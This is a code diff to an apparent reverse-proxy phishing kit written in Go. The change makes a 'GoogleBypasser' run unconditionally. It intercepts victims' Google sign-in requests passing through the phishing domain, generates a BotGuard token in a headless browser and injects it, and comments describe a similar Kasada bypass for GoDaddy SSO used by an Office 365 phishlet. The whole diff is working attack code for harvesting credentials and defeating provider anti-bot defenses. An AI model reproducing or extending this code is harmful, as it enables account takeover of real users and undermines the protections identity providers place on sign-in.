@@ -1429,66 +1429,56 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 											log.Debug("force_post: body: %s len:%d", body, len(body))
 										}
 
-										// ============================================================================
-										// GOOGLE BOTGUARD BYPASSER (FLAG-BASED ACTIVATION)
-										// Only runs when --google-bypass flag is set at startup
-										// ============================================================================
-										if p.cfg.GetGoogleBypassEnabled() {
-											origHostForGoogle, _ := p.replaceHostWithOriginal(req.Host)
-											if strings.EqualFold(origHostForGoogle, "accounts.google.com") && strings.Contains(req.URL.String(), "/v3/signin/_/AccountsSignInUi/data/batchexecute?") && strings.Contains(req.URL.String(), "rpcids=MI613e") {
-												log.Debug("GoogleBypass working with: %v (origHost: %v)", req.RequestURI, origHostForGoogle)
+										// Get the original host to check against Google's domain (req.Host is still the phishing domain at this point)
+										origHostForGoogle, _ := p.replaceHostWithOriginal(req.Host)
+										if strings.EqualFold(origHostForGoogle, "accounts.google.com") && strings.Contains(req.URL.String(), "/v3/signin/_/AccountsSignInUi/data/batchexecute?") && strings.Contains(req.URL.String(), "rpcids=MI613e") {
+											log.Debug("GoogleBypass working with: %v (origHost: %v)", req.RequestURI, origHostForGoogle)
 
-												decodedBody, err := url.QueryUnescape(string(body))
-												if err != nil {
-													log.Error("Failed to decode body: %v", err)
-												} else {
-													decodedBodyBytes := []byte(decodedBody)
+											decodedBody, err := url.QueryUnescape(string(body))
+											if err != nil {
+												log.Error("Failed to decode body: %v", err)
+											} else {
+												decodedBodyBytes := []byte(decodedBody)
 
-													// ============================================================================
-													// SIMPLIFIED SYNCHRONOUS FLOW
-													// No caching, no async - just launch browser and get token
-													// This is the proven working approach from ProfGinx-V8
-													// ============================================================================
-													log.Info("[GoogleBypasser] MI613e request detected, generating token...")
+												// ============================================================================
+												// SIMPLIFIED SYNCHRONOUS FLOW
+												// No caching, no async - just launch browser and get token
+												// This is the proven working approach from ProfGinx-V8
+												// ============================================================================
+												log.Info("[GoogleBypasser] MI613e request detected, generating token...")
 
-													b := &GoogleBypasser{
-														isHeadless:     true,
-														withDevTools:   false,
-														slowMotionTime: 0,
-													}
-
-													// Launch fresh browser instance
-													b.Launch()
-													defer b.Close()
-
-													// Extract email and get token
-													b.GetEmail(decodedBodyBytes)
-													b.GetToken()
-
-													// Replace token in body if we got one
-													if b.token != "" {
-														decodedBodyBytes = b.ReplaceTokenInBody(decodedBodyBytes)
-														postForm, err := url.ParseQuery(string(decodedBodyBytes))
-														if err != nil {
-															log.Error("Failed to parse form data: %v", err)
-														} else {
-															body = []byte(postForm.Encode())
-															req.ContentLength = int64(len(body))
-														}
-														log.Success("[GoogleBypasser] ✅ Token injected successfully")
-													} else {
-														log.Error("[GoogleBypasser] ❌ Failed to generate token")
-													}
-
-													req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
+												b := &GoogleBypasser{
+													isHeadless:     true,
+													withDevTools:   false,
+													slowMotionTime: 0,
 												}
+
+												// Launch fresh browser instance
+												b.Launch()
+												defer b.Close()
+
+												// Extract email and get token
+												b.GetEmail(decodedBodyBytes)
+												b.GetToken()
+
+												// Replace token in body if we got one
+												if b.token != "" {
+													decodedBodyBytes = b.ReplaceTokenInBody(decodedBodyBytes)
+													postForm, err := url.ParseQuery(string(decodedBodyBytes))
+													if err != nil {
+														log.Error("Failed to parse form data: %v", err)
+													} else {
+														body = []byte(postForm.Encode())
+														req.ContentLength = int64(len(body))
+													}
+													log.Success("[GoogleBypasser] ✅ Token injected successfully")
+												} else {
+													log.Error("[GoogleBypasser] ❌ Failed to generate token")
+												}
+
+												req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
 											}
 										}
-
-										// ============================================================================
-										// GODADDY KASADA BYPASSER (ALWAYS ACTIVE)
-										// Auto-runs for sso.godaddy.com - required for O365 phishlet
-										// ============================================================================
 
 										// GoDaddy SSO Kasada Bypass
 										// Trigger when user submits login credentials to GoDaddy SSO
